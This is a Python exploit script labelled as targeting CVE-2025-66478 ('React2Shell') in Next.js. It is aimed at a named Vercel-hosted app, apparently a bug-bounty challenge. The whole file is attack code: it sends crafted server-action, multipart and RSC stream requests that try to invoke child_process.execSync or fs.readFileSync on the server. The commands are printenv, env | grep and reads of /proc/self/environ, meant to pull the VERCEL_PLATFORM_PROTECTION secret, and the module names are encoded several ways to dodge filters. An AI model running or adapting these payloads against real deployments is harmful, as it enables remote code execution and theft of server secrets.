#!/usr/bin/env python3
"""
React2Shell (CVE-2025-66478) Exploit
Target: https://nextjs-cve-hackerone.vercel.app/
Goal: Extract VERCEL_PLATFORM_PROTECTION environment variable
"""

import requests
import json
import base64
import urllib.parse

TARGET = "https://nextjs-cve-hackerone.vercel.app"

def try_direct_rsc_action():
    """Try direct RSC action call with malicious payload"""
    print("\n[*] Attempting direct RSC action exploitation")

    # Craft malicious payload to execute command
    payloads = [
        # Variant 1: Direct child_process.execSync
        {
            "name": "Direct execSync",
            "action_id": "$$child_process",
            "action_name": "execSync",
            "args": ["printenv VERCEL_PLATFORM_PROTECTION"]
        },
        # Variant 2: Unicode encoding
        {
            "name": "Unicode encoded $$",
            "action_id": "\u0024\u0024child_process",
            "action_name": "execSync",
            "args": ["printenv VERCEL_PLATFORM_PROTECTION"]
        },
        # Variant 3: Internal module path
        {
            "name": "Internal module",
            "action_id": "$$internal/child_process",
            "action_name": "execSync",
            "args": ["echo $VERCEL_PLATFORM_PROTECTION"]
        },
        # Variant 4: URL encoded
        {
            "name": "URL encoded",
            "action_id": urllib.parse.quote("$$child_process"),
            "action_name": "execSync",
            "args": ["cat /proc/self/environ | tr '\\0' '\\n' | grep VERCEL"]
        },
        # Variant 5: Hex encoding
        {
            "name": "Hex encoded",
            "action_id": "\\x24\\x24child_process",
            "action_name": "execSync",
            "args": ["printenv | grep VERCEL"]
        },
        # Variant 6: Node require
        {
            "name": "Require chain",
            "action_id": "$$node_modules/child_process",
            "action_name": "execSync",
            "args": ["env | grep VERCEL"]
        },
        # Variant 7: fs.readFileSync for /proc/self/environ
        {
            "name": "fs readFileSync",
            "action_id": "$$fs",
            "action_name": "readFileSync",
            "args": ["/proc/self/environ", "utf8"]
        },
    ]

    for payload in payloads:
        print(f"\n[+] Testing: {payload['name']}")

        # Build multipart form data
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

        # Create action metadata
        metadata = {
            "id": payload["action_id"],
            "name": payload["action_name"],
            "bound": None
        }

        body = f'------{boundary}\r\n'
        body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
        body += json.dumps(metadata) + '\r\n'
        body += f'------{boundary}\r\n'
        body += 'Content-Disposition: form-data; name="1_0"\r\n\r\n'
        body += json.dumps(payload["args"]) + '\r\n'
        body += f'------{boundary}--\r\n'

        headers = {
            'Content-Type': f'multipart/form-data; boundary=----{boundary}',
            'Next-Action': payload["action_id"],
            'Accept': 'text/x-component',
            'User-Agent': 'Mozilla/5.0'
        }

        try:
            response = requests.post(TARGET, data=body, headers=headers, timeout=10)
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:500]}")

            if "VERCEL_PLATFORM_PROTECTION" in response.text or "VERCEL_" in response.text:
                print(f"\n[!!!] POTENTIAL FLAG FOUND [!!!]")
                print(response.text)
                return

        except Exception as e:
            print(f"    Error: {str(e)}")

def try_server_action_injection():
    """Try injecting into existing server action"""
    print("\n[*] Attempting server action injection")

    action_id = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

    # Try to inject malicious module reference
    malicious_payloads = [
        {
            "name": "Inject into action args",
            "action_id": action_id,
            "args": ["$$child_process", "execSync", "printenv VERCEL_PLATFORM_PROTECTION"]
        },
        {
            "name": "Replace action ID",
            "action_id": "$$child_process",
            "args": ["printenv VERCEL_PLATFORM_PROTECTION"]
        }
    ]

    for payload in malicious_payloads:
        print(f"\n[+] Testing: {payload['name']}")

        headers = {
            'Next-Action': payload["action_id"],
            'Content-Type': 'application/json',
            'Accept': 'text/x-component'
        }

        data = json.dumps(payload["args"])

        try:
            response = requests.post(TARGET, data=data, headers=headers, timeout=10)
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:500]}")

            if "VERCEL_" in response.text:
                print(f"\n[!!!] FLAG FOUND [!!!]")
                print(response.text)
                return

        except Exception as e:
            print(f"    Error: {str(e)}")

def try_stream_chunk_manipulation():
    """Try manipulating RSC stream chunks"""
    print("\n[*] Attempting stream chunk manipulation")

    # Try sending malformed RSC stream data
    malicious_chunks = [
        '0:{"id":"$$child_process","name":"execSync"}',
        '1:["printenv VERCEL_PLATFORM_PROTECTION"]',
    ]

    data = '\n'.join(malicious_chunks)

    headers = {
        'Content-Type': 'text/x-component',
        'Accept': 'text/x-component',
        'RSC': '1'
    }

    try:
        response = requests.post(f"{TARGET}/_rsc", data=data, headers=headers, timeout=10)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:500]}")

        if "VERCEL_" in response.text:
            print(f"\n[!!!] FLAG FOUND [!!!]")
            print(response.text)

    except Exception as e:
        print(f"Error: {str(e)}")

def main():
    print("=" * 60)
    print("React2Shell (CVE-2025-66478) Exploit")
    print("=" * 60)

    try_direct_rsc_action()
    try_server_action_injection()
    try_stream_chunk_manipulation()

    print("\n[*] Exploitation attempts completed")

if __name__ == "__main__":
    main()
